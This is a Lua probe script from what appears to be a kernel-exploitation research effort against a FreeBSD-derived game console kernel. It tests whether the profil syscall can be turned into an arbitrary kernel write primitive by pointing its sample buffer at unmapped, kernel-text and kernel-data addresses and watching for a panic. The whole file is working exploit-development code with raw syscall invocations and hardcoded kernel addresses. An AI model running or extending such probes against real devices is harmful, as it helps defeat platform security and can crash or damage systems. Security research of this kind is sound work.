-- CRASH_CLASS: HIGH -- arm [B] aims the profil tick write at an UNMAPPED user address.
--   If the statclock does a raw store, the kernel takes a fault in interrupt context and the
--   console PANICS (cold boot, power cycle). That panic IS the positive result: it means
--   pr_base is unchecked and the tick is an arbitrary kernel 16-bit increment.
--   If the process simply continues, the write is range-checked or masked and the lead is dead.
-- PROBE 1507a: is the profil tick a raw kernel store?
--
-- 1506b established that syscall 44 (profil) is LIVE on 14.10 and delivers statclock samples
-- into a caller-supplied buffer. With scale 1 and pr_off 0 the index is i = pc >> 16, and every
-- sample of a tight Lua spin fell on exactly ONE index (0x4D9, 1700 ticks in ~0.5 s), i.e.
--   uprof[i] += 1   at   pr_base + 2*i = pr_base + 0x9B2      (fixed offset for that loop)
-- A second arm with pr_off = 0x10000000 produced zero ticks, confirming the subtraction.
--
-- The 13.60 body stores the four caller qwords into [proc+0x58]+0xf0/+0xf8/+0x100/+0x108 with
-- no user-range test on pr_base, and 1377a measured 44(arg1 = kernel image base) -> rv=0 with
-- the process surviving, which stock FreeBSD cannot do (its profil() calls useracc() and would
-- return EFAULT). FreeBSD's consumer, addupc_intr, is a plain `uprof[i] += 1`, not a copyout, so
-- if Sony dropped the useracc() then this syscall is an arbitrary kernel 16-bit increment.
-- No `imul`+`shr 16`+indexed-store exists anywhere in the 5,343,048-instruction dump, so the
-- consumer cannot be resolved statically - it has to be measured.
--
-- [A] sanity: user buffer, short spin, tick count (must be non-zero or the probe proves nothing)
-- [B] THE TEST: pr_base = 0x1000 (unmapped user VA), same size/scale, spin
--       survived -> the store is validated or masked, lead dead
--       panic    -> raw store confirmed; record it and treat profil as a kernel write primitive
-- [C] only reached if [B] survived: pr_base = kernel image base (mapped, read-only text)
-- [D] only reached if [C] survived: pr_base = kernel image base + 0x1000000 (kernel data)
--
-- -- prior art:
--   results/phase36_realargs/1506b_profil_clean_20261109_222420.txt (profil is live, single fixed
--     tick index 0x4D9)
--   results/phase36_realargs/1506a_profil_consumer_live_20261109_222347.txt (first attempt, stale)
--   results/phase35_dead_end_reruns/1377a_arg1_kernel_class_bsd_20261109_132333.txt (44 with the
--     kernel image base returned 0 and the process survived)

print("=== PROBE 1507a: IS THE profil TICK A RAW KERNEL STORE? ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h = N(v.h); l = N(v.l) end
    if h >= 2147483648 then h = h - 4294967296 end
    if h == -1 and l >= 2147483648 then return l - 4294967296 end
    return h * 4294967296 + l
end
local KIMG = 0xFFFFFFFFCC800000   -- measured 2026-11-09 20:08 UTC by 1331a on this boot

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d  KIMG=0x%X (re-measure if this boot differs)", PID, KIMG))

local function profil(base, size, off, scale)
    local ok, rv = pcall(function()
        return mk(44)(uint64(base), uint64(size), uint64(off), uint64(scale), uint64(0), uint64(0))
    end)
    if not ok then return -999 end
    return sgn(rv)
end
local function spin(n) local x = 1 for i = 1, n do x = x + i end return x end

print("")
print("--- [A] sanity: user buffer must collect ticks ---")
local LEN, SIZE = 0x800000, 0x200000
local BUF = sgn(mk(477)(uint64(0), uint64(LEN), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
print(string.format("  mmap -> 0x%X %s", BUF, BUF < 0 and es() or ""))
if BUF < 0 then print("=== PROBE 1507a VOID ===") return end
pcall(function() memory.write_buffer(BUF, string.rep("\0", LEN)) end)

local a = profil(BUF, SIZE, 0, 1)
print(string.format("  arm(user) rv=%d %s", a, a < 0 and es() or ""))
spin(12000000)
profil(0, 0, 0, 0)

local okb, s = pcall(function() return memory.read_buffer(BUF, LEN) end)
local hits, idx = 0, -1
if okb and type(s) == "string" then
    local p = s:find("[^%z]")
    while p do hits = hits + 1
        if idx < 0 then idx = math.floor((p - 1) / 2) end
        p = s:find("[^%z]", p + 1)
    end
end
print(string.format("  ticks landed: %d bytes, first index 0x%X (tick offset +0x%X)", hits, idx,
      idx >= 0 and idx * 2 or 0))
if hits == 0 then
    print("  sampling produced nothing this run - the rest of the probe would prove nothing")
    print("=== PROBE 1507a INCOMPLETE ===")
    return
end
local TICKOFF = idx * 2

print("")
print("--- [B] THE TEST: pr_base = 0x1000, an unmapped user VA ---")
print(string.format("  a raw store would write at 0x%X", 0x1000 + TICKOFF))
print("  a PANIC from here means pr_base is unchecked and this is a kernel write primitive")
print("  if we return, the store is validated or masked - lead dead")
local b = profil(0x1000, SIZE, 0, 1)
print(string.format("  arm(unmapped) rv=%d %s", b, b < 0 and es() or ""))
if b < 0 then
    print("  the arm itself was refused, so nothing was tested")
    print("=== PROBE 1507a COMPLETE (arm refused) ===")
    return
end
spin(12000000)
profil(0, 0, 0, 0)
print("  *** SURVIVED the unmapped arm ***")

print("")
print("--- [C] pr_base = kernel image base (mapped, read-only text) ---")
print(string.format("  target 0x%X", KIMG + TICKOFF))
local c = profil(KIMG, SIZE, 0, 1)
print(string.format("  arm(KIMG) rv=%d %s", c, c < 0 and es() or ""))
spin(12000000)
profil(0, 0, 0, 0)
print("  *** SURVIVED the KIMG arm ***")

print("")
print("--- [D] pr_base = KIMG + 0x1000000 (kernel data segment) ---")
print(string.format("  target 0x%X", KIMG + 0x1000000 + TICKOFF))
local d = profil(KIMG + 0x1000000, SIZE, 0, 1)
print(string.format("  arm(KIMG+16M) rv=%d %s", d, d < 0 and es() or ""))
spin(12000000)
profil(0, 0, 0, 0)
print("  *** SURVIVED the kernel-data arm ***")

print("")
print("  Every arm returned. Either the tick store is validated (useracc-style) or it is")
print("  copyout-masked. Either way profil is not a write primitive from here.")
print(string.format("final canary pid %d", N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1507a COMPLETE ===")
